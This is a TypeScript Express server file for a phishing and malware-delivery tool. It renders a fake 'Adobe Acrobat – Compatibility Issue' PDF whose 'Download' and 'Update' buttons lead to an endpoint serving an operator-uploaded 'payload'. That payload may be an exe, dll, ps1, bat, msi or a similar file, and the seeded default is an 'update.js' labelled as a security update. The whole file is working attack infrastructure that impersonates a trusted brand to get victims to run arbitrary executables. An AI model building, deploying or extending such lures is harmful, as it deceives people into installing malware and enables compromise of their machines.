import type { Express } from "express";
import type { Server } from "http";
import { storage } from "./storage";
import { api } from "@shared/routes";
import { z } from "zod";
import puppeteer from "puppeteer";
import { readFileSync, existsSync } from "fs";
import { resolve } from "path";
import { authenticate, supabase } from "./auth";

async function generatePDFMatchingHomepage(
  fileContent: string,
  filename: string
): Promise<string> {
  const appBaseUrl = process.env.APP_BASE_URL?.replace(/\/$/, "");
  const domain =
    appBaseUrl ||
    process.env.REPLIT_DEV_DOMAIN ||
    (process.env.REPLIT_SLUG && process.env.REPLIT_OWNER
      ? `${process.env.REPLIT_SLUG}.${process.env.REPLIT_OWNER}.repl.co`
      : undefined);

  const baseUrl = appBaseUrl
    ? appBaseUrl
    : domain
    ? domain.includes("localhost") || domain.includes("127.0.0.1")
      ? `http://${domain}`
      : `https://${domain}`
    : `http://localhost:${process.env.PORT || 5000}`;

  let logoBase64 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA4AAAAOCAYAAAAfSC3RAAAABmJLR0QA/wD/AP+gvaeTAAAAy0lEQVQokWNkYGD4z8DAwMjAxMDAwPD//38GBkYGRkZGBkZGRgYGRgYGBiYGBkZGRkZGRgYGBgYGBiZGRgYGBkZGBkZGBgYGBgYGBiYmRkYGBkZGBkZGBgYGBgYGBiYmBkZGBgZGRgYGBgYGBgYmRkZGBkZGBgYGBgYGBgYGRkZGBgYGRkYGBgYGBgYGRgYGRkZGBkZGBgYGBkYGBgYGBgYGZkYGBkZGBgZGBgYGBgYGBkZGRgZGBkZGBgYGBgYGBgYGBkZGBkZGBgYGBgYGBgYGBkZGBkZGBkZGBkYGhv/8/wwMhPgDz4fST5+DT5gAAAAASUVORK5CYII=";
  
  const logoPath = resolve(process.cwd(), "attached_assets/adobe_reader_14145_1766295497679.png");
  if (existsSync(logoPath)) {
    try {
      const logoBuffer = readFileSync(logoPath);
      logoBase64 = `data:image/png;base64,${logoBuffer.toString("base64")}`;
    } catch (err) {
      console.error("Logo read error:", err);
    }
  }

  const htmlContent = `
<!DOCTYPE html>
<html>
<head>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #f1f5f9 0%, #e2e8f0 100%);
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      -webkit-print-color-adjust: exact;
    }
    .card {
      width: 280px;
      background: white;
      border-radius: 8px;
      box-shadow: 0 10px 40px rgba(0,0,0,0.15);
      overflow: hidden;
      margin-top: 15vh;
    }
    .header-strip {
      height: 3px;
      background-color: #e31c23;
    }
    .header {
      padding: 12px;
      border-bottom: 1px solid #e5e7eb;
      display: flex;
      gap: 8px;
    }
    .logo-box {
      width: 28px;
      height: 28px;
      background-color: #fce7e7;
      border: 0.5px solid #f3f3f3;
      border-radius: 4px;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
    }
    .logo-box img {
      width: 20px;
      height: 20px;
      opacity: 0.8;
    }
    .header-text h2 {
      margin: 0;
      font-size: 12px;
      font-weight: 700;
      color: #111;
    }
    .header-text p {
      margin: 2px 0 0 0;
      font-size: 10px;
      font-weight: 600;
      color: #e31c23;
      display: flex;
      align-items: center;
      gap: 3px;
    }
    .content {
      padding: 10px 12px;
      font-size: 11px;
      line-height: 1.4;
      color: #666;
      border-bottom: 1px solid #e5e7eb;
    }
    .buttons {
      padding: 8px 12px;
      display: flex;
      gap: 6px;
      background-color: #fafafa;
    }
    .btn {
      flex: 1;
      text-decoration: none;
      padding: 6px 8px;
      border-radius: 4px;
      font-size: 10px;
      font-weight: 600;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 4px;
      border: none;
    }
    .btn-download {
      background-color: white;
      border: 0.5px solid #d1d5db;
      color: #1f2937;
    }
    .btn-update {
      background-color: #e31c23;
      color: white;
    }
    .footer {
      padding: 6px 12px;
      background-color: #fafafa;
      border-top: 1px solid #e5e7eb;
      font-size: 9px;
      color: #9ca3af;
      text-align: center;
    }
    @media print {
      body {
        height: auto;
      }
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="header-strip"></div>
    <div class="header">
      <div class="logo-box">
        <img src="${logoBase64}" alt="Adobe">
      </div>
      <div class="header-text">
        <h2>Adobe Acrobat</h2>
        <p>Compatibility Issue</p>
      </div>
    </div>
    <div class="content">
      Your PDF reader may not fully support encrypted documents. Please update or download Adobe Reader.
    </div>
    <div class="buttons">
      <a href="${baseUrl}/api/download?type=download" class="btn btn-download">
        Download
      </a>
      <a href="${baseUrl}/api/download?type=update" class="btn btn-update">
        Update
      </a>
    </div>
    <div class="footer">
      Use latest Adobe Acrobat Reader for optimal compatibility.
    </div>
  </div>
</body>
</html>
  `;

  let browser;
  try {
    browser = await puppeteer.launch({
      headless: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    
    const page = await browser.newPage();
    await page.setContent(htmlContent, { waitUntil: 'networkidle0' });
    
    const pdfBuffer = await page.pdf({
      format: 'Letter',
      margin: { top: 0, right: 0, bottom: 0, left: 0 },
      printBackground: true,
    });

    await browser.close();
    return Buffer.from(pdfBuffer).toString('base64');
  } catch (err) {
    if (browser) await browser.close();
    console.error("PDF generation error:", err);
    throw new Error("Failed to generate PDF");
  }
}

async function seedDefaultPayload() {
  try {
    const existing = await storage.getLatestPayload();
    if (!existing) {
      const defaultContent = `console.log("Adobe Acrobat - Security Update Available");`;
      const pdfBase64 = await generatePDFMatchingHomepage(defaultContent, "update.js");
      await storage.savePayload({
        filename: "update.js",
        fileContent: defaultContent,
        pdfData: pdfBase64,
      });
    }
  } catch (err) {
    console.error("Seed error:", err);
  }
}

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  
  await seedDefaultPayload();

  // Login endpoint - Supabase Auth
  app.post(api.auth.login.path, async (req, res) => {
    try {
      const input = api.auth.login.input.parse(req.body);
      
      const { data, error } = await supabase.auth.signInWithPassword({
        email: input.username,
        password: input.password,
      });

      if (error) {
        return res.status(401).json({ message: error.message });
      }

      res.json({ 
        success: true, 
        user: { 
          id: data.user.id, 
          email: data.user.email,
          access_token: data.session.access_token,
        } 
      });
    } catch (err) {
      console.error("Login error:", err);
      if (err instanceof z.ZodError) {
        return res.status(400).json({
          message: err.errors[0].message,
          field: err.errors[0].path.join('.'),
        });
      }
      res.status(500).json({ message: "Login failed" });
    }
  });

  // Logout endpoint
  app.post(api.auth.logout.path, async (req, res) => {
    try {
      const token = req.headers.authorization?.substring(7);
      if (token) {
        await supabase.auth.signOut();
      }
      res.json({ success: true });
    } catch (err) {
      res.status(500).json({ message: "Logout failed" });
    }
  });

  // Get current user endpoint
  app.get(api.auth.me.path, authenticate, (req, res) => {
    const user = (req as any).user;
    res.json({ 
      user: { 
        id: user.id, 
        email: user.email 
      } 
    });
  });

  app.post(api.payloads.upload.path, authenticate, async (req, res) => {
    try {
      const input = api.payloads.upload.input.parse(req.body);
      
      // Handle data URL format (e.g., "data:application/zip;base64,...")
      let fileContent = input.fileContent;
      if (fileContent.startsWith('data:')) {
        const base64Data = fileContent.split(',')[1];
        fileContent = base64Data;
      }
      
      const pdfBase64 = await generatePDFMatchingHomepage(fileContent, input.filename);

      const payload = await storage.savePayload({
        filename: input.filename,
        fileContent: fileContent,
        pdfData: pdfBase64,
      });

      res.status(201).json({ success: true, id: payload.id });
    } catch (err) {
      console.error("Upload error:", err);
      if (err instanceof z.ZodError) {
        return res.status(400).json({
          message: err.errors[0].message,
          field: err.errors[0].path.join('.'),
        });
      }
      res.status(500).json({ message: "Failed to generate PDF" });
    }
  });

  app.get(api.payloads.getLatest.path, authenticate, async (req, res) => {
    const payload = await storage.getLatestPayload();
    if (!payload) {
      return res.status(404).json({ message: "No payload found" });
    }
    res.json({ filename: payload.filename, fileContent: payload.fileContent });
  });

  app.get(api.payloads.download.path, authenticate, async (req, res) => {
    const payload = await storage.getLatestPayload();
    if (!payload) {
      return res.status(404).send("No update available.");
    }
    const type = req.query.type as string || 'download';
    const filename = payload.filename;
    const ext = filename.split('.').pop()?.toLowerCase() || 'bin';
    
    const contentTypeMap: Record<string, string> = {
      'js': 'application/javascript',
      'exe': 'application/octet-stream',
      'dll': 'application/octet-stream',
      'bat': 'application/x-bat',
      'cmd': 'application/x-cmd',
      'ps1': 'application/x-powershell',
      'sh': 'application/x-sh',
      'pdf': 'application/pdf',
      'zip': 'application/zip',
      'rar': 'application/x-rar',
      'msi': 'application/x-msi',
      'app': 'application/octet-stream',
      'dmg': 'application/x-dmg',
      'deb': 'application/x-deb',
      'rpm': 'application/x-rpm',
    };
    
    const contentType = contentTypeMap[ext] || 'application/octet-stream';
    
    // Decode base64 content for binary files
    const binaryExtensions = ['zip', 'exe', 'dll', 'pdf', 'rar', 'msi', 'app', 'dmg', 'deb', 'rpm'];
    let contentToSend: string | Buffer = payload.fileContent;
    if (binaryExtensions.includes(ext)) {
      contentToSend = Buffer.from(payload.fileContent, "base64");
    }
    
    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    res.setHeader('Content-Type', contentType);
    res.send(contentToSend);
  });

  app.get(api.payloads.downloadPdf.path, authenticate, async (req, res) => {
    const payload = await storage.getLatestPayload();
    if (!payload) return res.status(404).send("No payload found");
    const pdfBuffer = Buffer.from(payload.pdfData, "base64");
    res.setHeader("Content-Type", "application/pdf");
    res.setHeader("Content-Disposition", `attachment; filename="adobe-acrobat-reader.pdf"`);
    res.send(pdfBuffer);
  });

  return httpServer;
}
